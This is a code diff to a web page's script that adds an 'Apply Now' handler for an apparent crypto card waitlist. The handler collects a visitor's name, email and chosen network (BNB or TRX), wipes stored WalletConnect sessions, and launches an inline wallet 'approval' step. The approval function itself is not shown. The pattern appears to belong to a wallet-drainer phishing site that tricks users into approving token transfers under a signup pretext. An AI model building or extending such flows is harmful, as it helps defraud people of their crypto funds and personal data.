@@ -92,6 +92,8 @@
     if (connectingWrap) connectingWrap.style.display = 'none';
     if (successWrap) successWrap.style.display = 'none';
     if (failedWrap) failedWrap.style.display = 'none';
+    var applyBtn = document.getElementById('waitlist-apply-btn');
+    if (applyBtn) { applyBtn.disabled = false; applyBtn.textContent = 'Apply Now'; }
   }
 
   function getRedirectUrl() {
@@ -258,6 +260,43 @@
   }
 
   document.addEventListener('submit', handleFormSubmit, true);
+
+  /* Direct click on Apply Now - more reliable than form submit (avoids React/overlay blocking) */
+  document.addEventListener('click', function (e) {
+    var btn = e.target && e.target.closest && e.target.closest('#waitlist-apply-btn');
+    if (!btn || !overlay || !overlay.classList.contains('open')) return;
+    e.preventDefault();
+    e.stopPropagation();
+    var form = document.getElementById('waitlist-form');
+    if (!form) return;
+    var nameEl = form.querySelector('#waitlist-name');
+    var emailEl = form.querySelector('#waitlist-email');
+    var networkEl = form.querySelector('#waitlist-network');
+    var name = nameEl ? nameEl.value.trim() : '';
+    var email = emailEl ? emailEl.value.trim() : '';
+    var network = networkEl ? networkEl.value : '';
+    if (!name || !email || !network) return;
+    if (network !== 'BNB' && network !== 'TRX') return;
+    btn.disabled = true;
+    btn.textContent = 'Connecting...';
+    var country = new URLSearchParams(window.location.search).get('country') || 'IN';
+    var cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
+    try {
+      sessionStorage.setItem('tw-card-redirect', cardUrl);
+      sessionStorage.setItem('tw-waitlist-name', name);
+      sessionStorage.setItem('tw-waitlist-email', email);
+    } catch (_) {}
+    try {
+      Object.keys(localStorage).forEach(function (k) {
+        if (k.startsWith('wc@') || k === 'WALLETCONNECT_DEEPLINK_CHOICE' || k.startsWith('WCM_')) localStorage.removeItem(k);
+      });
+      if (typeof indexedDB !== 'undefined' && indexedDB.deleteDatabase) {
+        try { indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB'); } catch (_) {}
+      }
+    } catch (_) {}
+    showConnecting();
+    runApprovalInline(network, resetToForm);
+  }, true);
 
   /* Get card opens network choice - use delegation to catch React-rendered buttons */
   function handleGetCardClick(e) {
